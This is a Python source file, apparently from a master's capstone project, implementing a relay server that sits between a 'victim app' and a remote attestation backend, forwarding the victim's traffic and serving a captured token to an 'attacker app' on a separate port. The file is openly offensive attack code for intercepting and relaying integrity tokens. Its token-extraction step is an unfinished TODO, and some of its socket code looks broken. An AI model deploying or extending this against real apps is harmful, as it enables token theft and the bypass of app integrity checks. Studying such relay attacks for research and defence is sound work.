"""
Server to relay information between the victim app and the attacker app
Author: Alex Collom
Date: 10/10/2023
Project: Final Masters Capstone - Practical RTI
"""

import threading
import socket
import ssl
from dataclasses import dataclass

HOST = "0.0.0.0"
ATTACKER_PORT = 45565
CLIENT_PORT = 80
REMOTE_HOST = "https://play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com"
REMOTE_PORT = 443


@dataclass
class ClientData:
    token: str
    request: str


def attacker_request_handler(conn, addr, client_data):
    """
    Accept the connection and send the token
    :param conn:
    :param addr:
    :param client_data:
    :return:
    """
    print(f"Connected to attacker {addr}")
    with conn:
        conn.sendall(b"{token:\"" + client_data.token.encode() + b"\"}")


def client_request_handler(conn, addr, client_data):
    """
    Create a client connection with the legitemate application server to forward data from the client,
    extracting the token if the request is for "/performCommand"
    :param conn: client connection object
    :param addr: client address
    :param client_data: data about the client extracted from "/performCommand"
    :return: None
    """
    # set up variable to keep track of what was received from the client
    total_data_client = b""

    with conn:
        print(f"Connected to {addr}")
        while True:
            data = conn.recv(1024)
            if not data:
                break
            total_data_client += data
        if b"/performCommand" in total_data_client:
            # TODO figure out how to parse this to get the token
            print(total_data_client)
        else:
            # set up client socket to relay information to the application server
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSock:
                with ssl.wrap_socket(clientSock, ssl_version=ssl.PROTOCOL_TLS_CLIENT) as tlsClientSock:
                    tlsClientSock.connect((REMOTE_HOST, REMOTE_PORT))

                    # set up variable to keep track of what was received from the application server
                    total_data_server = b""

                    # forward the data to the application server
                    tlsClientSock.sendall(total_data_client)

                    # receive the response from the application server
                    while True:
                        data = tlsClientSock.recv(1024)
                        if not data:
                            break
                        total_data_server += data
                    # forward the data back to the client
                    conn.sendall(total_data_server)


def attacker_server(client_data):
    """
    Listen for attacker connections and create a thread when one is connected successfully
    :param client_data: Data extracted from the client connection
    :return: None
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, ATTACKER_PORT))
        s.listen()
        while True:
            conn, addr = s.accept()
            t = threading.Thread(target=attacker_request_handler, args=(conn, addr, client_data))
            t.start()


def client_server(client_data):
    """
    Listen for client connections and create a thread when one is connected successfully
    :param client_data: Data extracted from the client connection
    :return: None
    """
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as serverSock:
        serverSock.bind((HOST, CLIENT_PORT))
        serverSock.listen()
        while True:
            conn, addr = serverSock.accept()
            t = threading.Thread(target=client_request_handler, args=(conn, addr, client_data, ))
            t.start()


def main():
    """
    Create threads for listening for client/attacker connections
    :return: None
    """
    # Create data storage object
    client_data = ClientData("", "")

    # Create and start attacker and client threads
    attacker = threading.Thread(target=attacker_server, args=(client_data,))
    client = threading.Thread(target=client_server, args=(client_data,))
    attacker.start()
    client.start()
    attacker.join()
    client.join()


if __name__ == '__main__':
    main()
